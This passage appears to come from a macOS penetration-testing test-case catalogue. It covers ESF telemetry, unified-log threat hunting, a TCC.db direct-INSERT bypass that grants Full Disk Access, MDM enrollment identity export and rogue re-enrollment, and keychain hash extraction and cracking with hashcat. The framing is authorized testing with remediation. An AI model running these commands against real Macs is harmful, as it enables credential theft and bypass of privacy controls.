| **Steps** | 1. Create a new macOS App project in Xcode with the "System Extension" template.<br>2. Add a new entitlements file with `com.apple.developer.endpoint-security.client = true`.<br>3. In `SystemExtensionRequest`, request activation of an `EndpointSecurityExtension`. Implement `start(_:completionHandler:)` in the extension principal class.<br>4. In the extension's `start` handler, call `es_new_client(&client, &handler)` with a handler that filters for `exec`, `open`, `write` events.<br>5. `es_subscribe_client(client, [ES_EVENT_TYPE_AUTH_EXEC, ...], count)`.<br>6. In the handler, log: `msg.event.exec.target.executable.path`, `msg.event.exec.target.process_audit_token.process_id`, parent PID.<br>7. For auth events, call `es_respond_auth_result(client, msg, ES_AUTH_RESULT_ALLOW, false)`.<br>8. Build and `systemextensionsctl install` (or use `smsandboxutil` / `activationRequest` API).<br>9. Trigger test activity (open a Terminal, run commands) and observe your log.<br>10. Compare with `sudo eslogger exec open write > /tmp/ref.log` to validate parity. |
| **Expected Result** | A custom System Extension that subscribes to ESF events and produces a log of process exec / file opens / file writes. Validate that the captured events are identical to what `eslogger` produces (same event types, same audit tokens, same paths). This demonstrates that commercial EDR sees no more than ESF provides — symmetric visibility. |
| **Remediation** | Apple's 2023 restriction on `com.apple.developer.endpoint-security.client` makes new ESF clients difficult without a commercial EDR contract. For lab testing, use `amfi_get_out_of_my_way=1` (boot-args) on a SIP-disabled test Mac. For production deployment, apply via Apple's EDR vendor program. |
| **Verification Checklist** | [ ] Xcode System Extension project compiles; [ ] entitlements file includes `endpoint-security.client`; [ ] `es_new_client` returns ES_NEW_CLIENT_RESULT_SUCCESS; [ ] subscribe succeeds; [ ] handler receives `exec` events; [ ] handler responds to auth events; [ ] output matches `eslogger` parity; [ ] System Extension visible in `systemextensionsctl list`. |
| **Tools** | Xcode, Swift/C, codesign, systemextensionsctl, eslogger (parity check), sudo |
| **MITRE** | T1057-Process Discovery (defender), T1082-System Information Discovery (defender), T1547-detection |
| **Difficulty** | Hard |
| **Tags** | esf, system-extension, es_new_client, eslogger, edr-telemetry, custom-esf-client |

### TC-MO-015: Unified Log Threat Hunting

| Field | Value |
|------|-----|
| **ID** | TC-MO-015 |
| **Title** | Post-Compromise Unified Log Threat Hunting — TCC Grants, AMFI Denials, exec Telemetry |
| **Objective** | Use the unified log (`log show`) to reconstruct attacker activity on a suspected-compromised Mac. Focus on TCC grants, AMFI denials (signature failures), process exec events, and keychain access patterns. |
| **Prerequisite** | A Mac suspected of compromise; sudo access; sufficient disk space for log extraction (the unified log can be 100s of MB per day). Time window for the suspected compromise (e.g., "between 2025-03-15 and 2025-03-17"). |
| **Steps** | 1. `sudo log show --last 7d --info --debug > /tmp/full_log.txt` — extract the last 7 days of unified log (verbose).<br>2. Filter for TCC events: `grep "subsystem.*com.apple.TCC" /tmp/full_log.txt \| grep -iE "grant\|allow\|deny\|prompt"`. Identify any new TCC grants in the suspected window.<br>3. Filter for AMFI denials: `grep "subsystem.*com.apple.amfi" /tmp/full_log.txt \| grep -i "denied"`. Identify binaries that failed signature verification.<br>4. Filter for exec events: `grep -E "subsystem.*com.apple.securityd" /tmp/full_log.txt \| grep -E "exec" \| grep -vE "/usr/libexec\|/System/Library"`. Identify suspicious execution paths.<br>5. Filter for keychain access: `grep -E "subsystem.*com.apple.securityd" /tmp/full_log.txt \| grep -iE "dump-keychain\|find-generic-password"`. Identify credential extraction.<br>6. Filter for LaunchAgent/LaunchDaemon writes: `grep -E "/Library/(LaunchAgents\|LaunchDaemons)/" /tmp/full_log.txt`. Identify persistence installation.<br>7. Pivot to Spotlight metadata for deleted files: `sudo mdutil -s /` then `sudo find /.Spotlight-V100 -name "*.metadata_core" -newer /tmp/start_time`. Recover metadata of files that existed during the attack window.<br>8. Check FSEvents: `sudo ls -la /.fseventsd/` then parse with `python3 fsevents_parser.py /.fseventsd/*` (community tool). |
| **Expected Result** | A reconstructed timeline of attacker activity: every TCC grant, every suspicious exec, every LaunchAgent write, every keychain read. Identify the initial access vector, persistence mechanism, and data-exfiltration indicators. |
| **Remediation** | Forward the unified log to a SIEM (Splunk, Elastic, Chronicle) for continuous monitoring. Configure log retention to 90+ days. Subscribe to ESF-based detection rules. Monitor for high-risk patterns: new Full Disk Access grants to non-Apple binaries, `security dump-keychain` from non-Terminal processes, LaunchAgent writes outside installers. |
| **Verification Checklist** | [ ] log extracted for full time window; [ ] TCC subsystem filtered; [ ] AMFI subsystem filtered; [ ] exec subsystem filtered; [ ] keychain access identified; [ ] LaunchAgent writes identified; [ ] Spotlight metadata checked; [ ] FSEvents parsed; [ ] timeline reconstructed. |
| **Tools** | log (built-in), grep, mdutil, find, sudo, community FSEvents parser |
| **MITRE** | T1070-Indicator Removal on Host (detection), T1562-Impair Defenses (detection), T1057-Process Discovery (defender) |
| **Difficulty** | Hard |
| **Tags** | unified-log, threat-hunting, tcc, amfi, fsevents, spotlight, post-compromise |

---

## K. TCC Deep Dive

### TC-MO-016: TCC.db Reverse Engineering

| Field | Value |
|------|-----|
| **ID** | TC-MO-016 |
| **Title** | TCC.db Schema Reverse Engineering and Direct INSERT Bypass |
| **Objective** | Reverse-engineer the TCC database schema, understand every column in the `access` table, and demonstrate the direct-INSERT TCC bypass (requires SIP weakened). Identify why the bypass requires SIP disabled and reason about hardening. |
| **Prerequisite** | A test Mac with SIP **disabled** (boot into Recovery, run `csrutil disable`, reboot). The test Mac must NOT be a production Mac — disabling SIP removes a critical protection layer. Familiarity with sqlite3 and macOS internals. |
| **Steps** | 1. `sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db ".schema access"` — dump the full schema. Document every column: `service`, `client`, `client_type`, `auth_value`, `auth_reason`, `auth_version`, `flags`, `last_modified`, `pid`, `pid_version`, `boot_uuid`, `last_seen_auth_time`, `expired_at`.<br>2. Decode `auth_value` constants: `0 = denied`, `2 = allowed`, `3 = limited`. Decode `auth_reason`: `1 = user_set`, `2 = user_set_with_modify`, `3 = system_set`, `4 = system_default`, `5 = mdm`.<br>3. Enumerate every service identifier Apple uses (`kTCCService*`):<br>   - `kTCCServiceSystemPolicyAllFiles` (Full Disk Access)<br>   - `kTCCServiceAccessibility` (Accessibility — drive other apps)<br>   - `kTCCServiceAppleEvents` (automation)<br>   - `kTCCServiceSystemPolicyDesktopFolder`, `kTCCServiceSystemPolicyDocumentsFolder`, `kTCCServiceSystemPolicyDownloadsFolder`<br>   - `kTCCServiceCamera`, `kTCCServiceMicrophone`, `kTCCServiceLocation`, `kTCCServiceContacts`, `kTCCServiceCalendar`, `kTCCServiceReminders`, `kTCCServicePhotos`, `kTCCServiceMediaLibrary`<br>   - `kTCCServiceScreenCapture`, `kTCCServicePostEvent`, `kTCCServiceListenEvent`<br>4. **Direct INSERT bypass** (requires SIP disabled): `sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version, indirect_object_identifier_type, indirect_object_identifier, flags, last_modified) VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.example.attacker', 0, 2, 0, 1, 0, 'UNUSED', 0, strftime('%s','now'));"` — grants Full Disk Access to a fake bundle ID.<br>5. Verify the bypass: `sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "SELECT service, client, auth_value FROM access WHERE client = 'com.example.attacker';"`.<br>6. Clean up: `sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "DELETE FROM access WHERE client = 'com.example.attacker';"`.<br>7. **Re-enable SIP**: boot into Recovery, `csrutil enable`, reboot. |
| **Expected Result** | A documented TCC schema with every column decoded. Demonstration that direct sqlite INSERT grants any TCC privilege when SIP is disabled. CRITICAL finding: if SIP is disabled on a production host, the entire TCC layer is subverted. |
| **Remediation** | Ensure SIP is enabled on all production Macs (`csrutil status` → "enabled"). Apple's hardening: on modern macOS, TCC.db is also protected by System Integrity Protection and (on Apple Silicon) the Signed System Volume seal — direct writes are blocked even with root unless SIP is fully disabled. Monitor via ESF for any `open/write` on the TCC.db file by a process other than `tccd`. |
| **Verification Checklist** | [ ] schema dumped; [ ] all columns documented; [ ] auth_value constants decoded; [ ] service identifiers enumerated; [ ] direct INSERT demonstrated (test host); [ ] grant verified; [ ] cleanup confirmed; [ ] SIP re-enabled. |
| **Tools** | sqlite3, sudo, csrutil (recovery), Bash |
| **MITRE** | T1068-Exploitation for Privilege Escalation (TCC bypass), T1078-Valid Accounts (TCC grant abuse) |
| **Difficulty** | Hard |
| **Tags** | tcc, tcc-db, sqlite, sip-bypass, full-disk-access, schema, direct-insert |

---

## L. MDM Profile Abuse

### TC-MO-017: MDM Profile Abuse and DEP Re-Enrollment Race

| Field | Value |
|------|-----|
| **ID** | TC-MO-017 |
| **Title** | MDM Profile Analysis, Enrollment Identity Extraction, and DEP Re-Enrollment Race |
| **Objective** | From a compromised Mac, extract the MDM enrollment identity, identify the MDM vendor and server URL, and document the DEP re-enrollment race (wiping the host to enroll in a different MDM before DEP check-in). Identify what an attacker with root can do with MDM access. |
| **Prerequisite** | Root access on a Mac enrolled in MDM (Jamf / Intune / Kandji / etc.). Authorization for active testing — NEVER test against a production Mac. Familiarity with MDM protocols (APNs, SCEP, configuration profiles). |
| **Steps** | 1. `sudo profiles list` — enumerate all installed profiles. Document every PayloadIdentifier, PayloadDisplayName, and PayloadType.<br>2. `sudo profiles show -identifier com.example.mdm` — dump the MDM profile payload. Extract the ServerURL (`https://mdm.example.com/mdm/...`), Topic (APNs topic, e.g., `com.apple.mgmt.External.<UUID>`), and SignMessage identity.<br>3. `sudo defaults read /Library/Preferences/com.apple.mdm` — verify the MDM enrollment state. Look for `ServerURL`, `Topic`, `EnrollmentID`, `DeviceID`, `UnlockToken` (encrypted).<br>4. `sudo security find-certificate -a -c "MDM" /Library/Keychains/System.keychain` — extract the MDM identity certificate chain.<br>5. Export the identity: `sudo security export -k /Library/Keychains/System.keychain -t identities -f pemseq -o /tmp/mdm_identity.pem` (after sudo prompt).<br>6. Verify the identity can be used for MDM: `openssl x509 -in /tmp/mdm_identity.pem -noout -subject -issuer -dates`.<br>7. Identify the MDM vendor: check ServerURL host (e.g., `*.jamfcloud.com`, `*.manage.microsoft.com`, `*.kandji.io`), profile identifiers (`com.jamf.*`, `com.microsoft.intune.*`).<br>8. Document the DEP re-enrollment race: on a test Mac, wipe the disk (`diskutil eraseDisk`), reinstall macOS from Recovery, and during the Setup Assistant, race to install a custom profile before DEP check-in completes. Document the failure rate (modern macOS is generally fast enough to win).<br>9. Document the enrollment identity theft scenario: take the exported identity, install on a different Mac, attempt to enroll as the original device. Document what works (often succeeds if the MDM server does not validate hardware UUID). |
| **Expected Result** | A documented MDM posture: vendor, server URL, APNs topic, enrollment identity. Demonstration that the enrollment identity can be exported and (in some MDM configurations) used to enroll rogue devices. CRITICAL finding: MDM identity theft is a multi-device attack vector. |
| **Remediation** | MDM servers should validate hardware UUID and serial number on enrollment. Use supervised mode (DEP / Automated Device Enrollment) on all enterprise Macs. Rotate the MDM identity on host decommissioning. Monitor via ESF for `security export` of system keychain identities. Apple's Platform Security Guide treats MDM as a privileged trust boundary — protect accordingly. |
| **Verification Checklist** | [ ] profiles enumerated; [ ] MDM payload dumped; [ ] ServerURL extracted; [ ] APNs topic extracted; [ ] enrollment identity exported; [ ] vendor identified; [ ] DEP race documented; [ ] identity theft scenario tested (with authorization). |
| **Tools** | profiles, defaults, security, openssl, sudo, Bash |
| **MITRE** | T1098-Account Manipulation (MDM enrollment abuse), T1078-Valid Accounts (enrollment identity theft), T1552-Unsecured Credentials |
| **Difficulty** | Hard |
| **Tags** | mdm, dep, enrollment-identity, jamf, intune, kandji, supervised, profiles |

---

## M. Keychain Offline Cracking

### TC-MO-018: Keychain Offline Hash Extraction and Cracking

| Field | Value |
|------|-----|
| **ID** | TC-MO-018 |
| **Title** | Keychain Hash Extraction (chainbreaker / keychaindump) and Offline Cracking |
| **Objective** | Extract password hashes from a captured `login.keychain-db` using open-source tools (chainbreaker, keychaindump, chaindump), and attempt offline cracking with hashcat. Demonstrate the impact of a captured keychain file (e.g., from a stolen Mac without FileVault). |
| **Prerequisite** | A captured `login.keychain-db` from a test Mac (copy from `~/Library/Keychains/login.keychain-db` on a test host). Do NOT use a production user's keychain. hashcat installed. Familiarity with offline password cracking and PBKDF2. |
| **Steps** | 1. Copy the test keychain: `cp ~/Library/Keychains/login.keychain-db /tmp/test.keychain`.<br>2. Install chainbreaker: `pip3 install chainbreaker` or `git clone https://github.com/n0fate/chainbreaker`.<br>3. Extract metadata: `chainbreaker --dump-all /tmp/test.keychain` — without a password, this dumps entry metadata only (account names, service, creation dates).<br>4. Attempt to read entries with a known password: `chainbreaker --password <password> --dump-all /tmp/test.keychain`.<br>5. Extract the PBKDF2 hash for offline cracking: `chainbreaker --dump-hash /tmp/test.keychain > /tmp/hash.txt` (note: this requires the master key derivation; chainbreaker produces a hashcat-mode format).<br>6. Crack with hashcat: `hashcat -m 23100 /tmp/hash.txt /usr/share/wordlists/rockyou.txt` (mode 23100 = Apple Keychain PBKDF2-HMAC-SHA1).<br>7. Monitor hashcat progress: `hashcat -m 23100 /tmp/hash.txt --status --status-timer=30`.<br>8. Alternative — install keychaindump (older): `git clone https://github.com/juuso/keychaindump`; run `sudo keychaindump` on the live host to extract hashes from the running `securityd` (requires root, no keychain password needed — uses the in-memory key).<br>9. Document cracked credentials, time-to-crack, and wordlist used. |
| **Expected Result** | Cracked user login password (if weak). Demonstrates that a stolen Mac without FileVault, or a captured keychain file, can be cracked offline — exposing every saved password. CRITICAL impact: a captured keychain + weak user password = full credential compromise within hours. |
| **Remediation** | Enable FileVault on all production Macs (encrypts the keychain at rest). Use strong user passwords (12+ chars, high entropy). Rotate credentials if a Mac is lost/stolen. Apple's hardening: on modern macOS, the keychain master key is derived from the user's login password + a hardware-bound salt (Secure Enclave on Apple Silicon), making offline cracking significantly harder than older macOS. |
| **Verification Checklist** | [ ] test keychain captured; [ ] chainbreaker installed; [ ] metadata dumped without password; [ ] hash extracted; [ ] hashcat mode 23100 launched; [ ] keychaindump alternative tested; [ ] time-to-crack documented; [ ] findings reported. |
| **Tools** | chainbreaker, keychaindump, hashcat, openssl, pip3, sudo |
| **MITRE** | T1555.001-Credentials from Keychain, T1110-Brute Force, T1552-Unsecured Credentials |
| **Difficulty** | Hard |
| **Tags** | keychain, chainbreaker, keychaindump, hashcat, pbkdf2, offline-cracking, filevault |



## Appendix: Severity Calibration

| Severity | Definition | Example |
|----------|------------|---------|
| **LOW** | Reconnaissance / profiling. No impact alone. | TC-MO-001 (host profiling), TC-MO-002 (SIP status), TC-MO-010 (KnockKnock scan) |
| **MEDIUM** | Authenticated enumeration that expands attacker knowledge or identifies high-impact configurations. | TC-MO-003 (TCC audit), TC-MO-004 (persistence enum), TC-MO-007 (MDM analysis), TC-MO-008 (code signing), TC-MO-009 (Mach-O analysis), TC-MO-011 (ESF logging), TC-MO-012 (Apple Silicon check) |
| **HIGH** | Credential extraction or bypass that grants unauthorized access to user data. | TC-MO-005 (keychain extraction), TC-MO-006 (cookies + Safari history) |
| **CRITICAL** | (Reserved for full-chain macOS compromise combining multiple techniques; not represented as a single TC.) | n/a |

## Appendix: Test Environment Setup

For reproducible testing, set up isolated macOS environments:

- **VMware Fusion Pro 13+**: Free for personal use since May 2023; full Apple Silicon support.
  - Create a VM from the macOS Restore IPSW (`ipsw` file from Apple).
  - Snapshot before each test cycle for instant rollback.
  - Note: VMs on Apple Silicon can only run macOS 12+ (no Intel macOS VMs).
- **Parallels Desktop (commercial)**: Excellent performance; supports both Intel (older) and Apple Silicon Macs.
- **UTM (free, open-source)**: Supports QEMU (slower) and Apple's native hypervisor.
- **Bare-metal test Mac**: A dedicated MacBook Air / Mac mini for malware detonation and active exploitation.
  - Install fresh from Recovery (`Cmd+R` Intel, or hold power button Apple Silicon).
  - Snapshot via `diskutil apfs createSnapshot /` before each test.
  - Wipe and reinstall between engagements.
- **Apple Business Manager + free MDM trial**: For MDM-specific testing.
  - Jamf Now (free for up to 3 devices).
  - Kandji / Addigy / Mosyle free trials.
  - Microsoft Intune trial (requires Azure AD tenant).

Run all destructive tests (TC-MO-005 keychain dump, TC-MO-006 cookie extraction, TC-MO-008 with revoked / malicious Developer IDs, and any SIP-disable operations) on a VM snapshot or dedicated test Mac — never on a production Mac.

## Appendix: Prerequisites Matrix

Every test case has implicit or explicit prerequisites that gate execution. The matrix below summarizes the most-cited prerequisites across all 18 test cases. Run the prerequisite check before invoking the corresponding test case to avoid wasted cycles.

| Prerequisite Category | Affected TCs | Check Command | Pass Condition |
|----------------------|--------------|---------------|----------------|
| **Apple Silicon host** | TC-MO-012, TC-MO-013 | `uname -m` | Output is `arm64` |
| **SIP enabled (no bypass)** | TC-MO-002, TC-MO-013, TC-MO-015 | `csrutil status` | Output contains "fully enabled" |
| **SIP disabled (test host only)** | TC-MO-016 | `csrutil status` | Output contains "disabled" |
| **Authenticated-root enabled** | TC-MO-002, TC-MO-012, TC-MO-013 | `csrutil authenticated-root status` | Output contains "enabled" |
| **Full Disk Access for calling terminal** | TC-MO-003, TC-MO-005, TC-MO-006, TC-MO-015, TC-MO-016 | `ls ~/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies` | Exit code 0 (file is readable) |
| **sudo / root access** | TC-MO-002, TC-MO-005, TC-MO-007, TC-MO-011, TC-MO-013, TC-MO-015, TC-MO-016, TC-MO-017, TC-MO-018 | `sudo -n true` | Exit code 0 |
| **MDM enrollment** | TC-MO-007, TC-MO-017 | `sudo profiles list` | At least one profile listed |
| **mdm/non-supervised (removable profiles)** | TC-MO-007 | `profiles show -type enrollment` | Output contains "Not Enrolled" or "Enrolled" (vs DEP) |
| **Installed tools: Objective-See KnockKnock** | TC-MO-010 | `ls /Applications/KnockKnock.app` | File exists |
| **Installed tools: chainbreaker / hashcat** | TC-MO-018 | `which chainbreaker hashcat` | Both paths printed |
| **Apple Developer entitlement (or AMFI disabled)** | TC-MO-014 | `codesign -d --entitlements - <your-se>` | Entitlements include `endpoint-security.client` |
| **eslogger (macOS 13+)** | TC-MO-011 | `which eslogger` | Path printed |
| **Time window for log hunting** | TC-MO-015 | `diskutil info / \| grep "Free Space"` | > 5 GB free for log dump |
| **Test VM snapshot taken** | ALL destructive tests | `tmutil listlocalsnapshots /` | Snapshot listed |
| **Authorization scope** | ALL tests | Engagement letter / scope-of-work | Explicit macOS testing authorized |

### Per-Test Prerequisite Detail

- **TC-MO-001**: none (read-only profiling).
- **TC-MO-002**: requires sudo for `nvram boot-args` and the `/System/test` write test.
- **TC-MO-003**: requires Full Disk Access for the calling terminal/iTerm (System Settings → Privacy & Security → Full Disk Access).
- **TC-MO-004**: requires sudo for `/Library/LaunchDaemons/`.
- **TC-MO-005**: requires user interaction (keychain password prompts). Use `-d ~/Library/Keychains/login.keychain-db` to specify which keychain.
- **TC-MO-006**: requires Full Disk Access for the calling terminal.
- **TC-MO-007**: requires sudo for system profiles.
- **TC-MO-008**: no privilege required for non-system applications.
- **TC-MO-009**: no privilege required for analysis of binaries the user can read.
- **TC-MO-010**: requires KnockKnock installation.
- **TC-MO-011**: requires sudo; macOS 13+.
- **TC-MO-012**: requires Apple Silicon host.
- **TC-MO-013**: requires sudo; Apple Silicon host; SIP must be enabled for the test to be meaningful.
- **TC-MO-014**: requires Apple Developer entitlement OR AMFI disabled (test host).
- **TC-MO-015**: requires sudo; ~5 GB disk for log dump.
- **TC-MO-016**: requires SIP **disabled** (test host only — never disable SIP in production).
- **TC-MO-017**: requires root; MDM-enrolled Mac.
- **TC-MO-018**: requires captured keychain + hashcat + chainbreaker.

## Appendix: Remediation Playbook

Each finding from the test cases maps to a specific defensive remediation. Use this section when writing the engagement report.

| Finding | Affected TCs | Remediation Steps |
|---------|--------------|-------------------|
| **SIP disabled on production host** | TC-MO-002, TC-MO-013 | 1. Boot into Recovery (hold power button on Apple Silicon). 2. Run `csrutil enable` and `csrutil authenticated-root enable`. 3. Reboot. 4. Document the host and investigate how SIP came to be disabled. |
| **Debug boot-args present** | TC-MO-002 | 1. `sudo nvram -d boot-args`. 2. Reboot. 3. Verify `nvram boot-args` returns empty. |
| **Full Disk Access granted to non-Apple binary** | TC-MO-003 | 1. Identify the binary's purpose (legitimate internal tool vs malware). 2. If legitimate, scope the grant to a sub-path via sandbox profile. 3. If unknown, revoke via `tccutil reset SystemPolicyAllFiles`. 4. Alert the user via MDM message. |
| **Suspicious LaunchAgent / LaunchDaemon** | TC-MO-004, TC-MO-010 | 1. Quarantine the binary (`mv <path> /tmp/quarantine/`). 2. `launchctl unload <label>`. 3. Submit the binary to VirusTotal / Joe Sandbox. 4. Block the Developer ID via MDM if malicious. |
| **Keychain items exposed** | TC-MO-005, TC-MO-018 | 1. Rotate every credential that was in the keychain. 2. Enable FileVault if not already enabled. 3. Reset the user's login password. 4. Re-issue MDM identity (TC-MO-017 follow-up). |
| **Safari cookies extracted** | TC-MO-006 | 1. Sign out of every active session in Safari → Settings → Privacy → Manage Website Data. 2. Force password reset on banking / SSO / email accounts. 3. Consider blocking the originating IP / device fingerprint. |
| **Unsigned or ad-hoc signed binary in LaunchAgents** | TC-MO-004, TC-MO-008, TC-MO-010 | 1. Quarantine the binary. 2. Identify the source (legitimate installer vs malware). 3. If malicious, block via Gatekeeper policy (`spctl --add`). 4. Enforce Developer ID + notarization via MDM. |
| **MDM profile signed by unexpected vendor** | TC-MO-007, TC-MO-017 | 1. Verify the vendor identity against the engagement's asset inventory. 2. If unexpected, quarantine the profile (`profiles remove -identifier <id>`). 3. Investigate the install path (was it pushed via MDM or installed locally?). 4. Consider device wipe if the profile introduced a persistent attacker foothold. |
| **Mach-O binary with high-risk entitlements** | TC-MO-008, TC-MO-009 | 1. Document the binary's purpose. 2. If the entitlements are unjustified (e.g., `disable-library-validation` on a non-JIT binary), file a CVE / vendor report. 3. If the binary is malicious, block the Team ID via MDM. |
| **Apple Silicon PAC disabled or SSV unsealed** | TC-MO-012, TC-MO-013 | 1. Boot into Recovery. 2. `csrutil enable` and `csrutil authenticated-root enable`. 3. If the SSV cannot be re-sealed (hardware tampering indicator), wipe and reinstall macOS from IPSW. 4. Consider hardware replacement if the host was seized. |
| **ESF event shows unexpected LaunchAgent write** | TC-MO-011, TC-MO-014, TC-MO-015 | 1. Pivot the ESF timeline to identify the writing process. 2. Trace the process tree back to the initial access vector. 3. Quarantine the writer binary. 4. Document the full kill chain for IR reporting. |
| **MDM enrollment identity exportable** | TC-MO-017 | 1. Rotate the enrollment identity (re-issue via Jamf/Intune). 2. Validate the MDM server requires hardware UUID match on enrollment. 3. Audit recent enrollments for the same hardware UUID. |
| **Keychain crackable in < 24h with rockyou** | TC-MO-018 | 1. Force a password policy requiring 12+ chars, mixed case, digit, symbol. 2. Enable FileVault (encrypts the keychain at rest). 3. Audit user password strength periodically via `pwpolicy`. |

## Appendix: Verification Checklist

A single consolidated checklist for verifying that every test case in this file has been run to completion. Use this when closing out an engagement to ensure no test case was skipped.

### Pre-Engagement

- [ ] Written authorization scope received (explicit macOS testing, target host list).
- [ ] Test environment prepared (VM snapshot OR dedicated bare-metal test Mac).
- [ ] MDM test tenant provisioned (Jamf Now / Intune trial) if MDM testing is in scope.
- [ ] Tools staged: KnockKnock, chainbreaker, hashcat, jtool2, Equity, machOView, Hopper.
- [ ] ESF capture logging started on a sibling Mac (for parallel telemetry validation).

### Per-Test-Case Verification

- [ ] **TC-MO-001**: System profile recorded (version, arch, FileVault, admin membership, EDR presence).
- [ ] **TC-MO-002**: SIP status documented; write test to `/System/test` completed (should fail on production).
- [ ] **TC-MO-003**: Both TCC.db files (user + system) audited; high-impact grants flagged.
- [ ] **TC-MO-004**: All LaunchAgents + LaunchDaemons + secondary persistence locations enumerated; each item's signing verified.
- [ ] **TC-MO-005**: Login keychain dumped; Wi-Fi PSKs extracted; system keychain audited for MDM identity.
- [ ] **TC-MO-006**: Safari cookies + History.db extracted; impact assessment written.
- [ ] **TC-MO-007**: All configuration profiles listed; payloads extracted; MDM vendor identified; DEP status checked.
- [ ] **TC-MO-008**: At least one suspicious binary's code-signing chain fully documented.
- [ ] **TC-MO-009**: At least one Mach-O statically analyzed (header, load commands, libs, symbols, ObjC metadata, entitlements, strings).
- [ ] **TC-MO-010**: KnockKnock scan completed; red items investigated.
- [ ] **TC-MO-011**: ESF event capture for ≥ 5 minutes of activity; process-tree timeline constructed.
- [ ] **TC-MO-012**: Apple Silicon checks confirmed (PAC capability, sealed snapshot, Rosetta 2 status).
- [ ] **TC-MO-013**: Boot chain reconstructed; firmlinks verified; SEP confirmed present.
- [ ] **TC-MO-014**: Custom ESF client built (or `eslogger` parity validated); events match reference log.
- [ ] **TC-MO-015**: Unified log threat-hunted for the engagement window; TCC/AMFI/exec anomalies documented.
- [ ] **TC-MO-016**: TCC.db schema documented; direct INSERT bypass demonstrated (SIP-disabled test host only).
- [ ] **TC-MO-017**: MDM identity extracted; vendor identified; DEP race or identity theft scenario documented (with authorization).
- [ ] **TC-MO-018**: Test keychain captured; chainbreaker hash extracted; hashcat cracking attempted; time-to-crack documented.

### Post-Engagement

- [ ] All destructive changes reverted (test VM rolled back; test Mac wiped).
- [ ] Captured credentials securely destroyed (Cookies.binarycookies, keychain dumps).
- [ ] Developer ID certificates / notarization credentials not committed to the report.
- [ ] Findings report written with per-TC severity ratings and remediation steps.
- [ ] Executive summary includes the macOS-specific hardening recommendations (SIP, FileVault, MDM supervision, EDR deployment).
- [ ] Customer debrief scheduled; remediation tracking (Jira / service-now tickets) opened for each HIGH/CRITICAL finding.

### Cleanup Checklist

- [ ] Test LaunchAgents removed: `rm ~/Library/LaunchAgents/com.example.*.plist`.
- [ ] Test TCC.db entries removed (if direct INSERT tested): `sudo sqlite3 ... "DELETE FROM access WHERE client LIKE 'com.example.%';"`.
- [ ] Test MDM profiles removed (if non-supervised): `sudo profiles remove -identifier com.example.*`.
- [ ] SIP re-enabled on test Mac (if disabled): boot into Recovery, `csrutil enable`.
- [ ] ESF capture stopped and rotated: `sudo launchctl bootout system/com.example.esf-client`.
- [ ] Captured hashes / keychain files securely erased: `srm -v /tmp/test.keychain /tmp/hash.txt`.
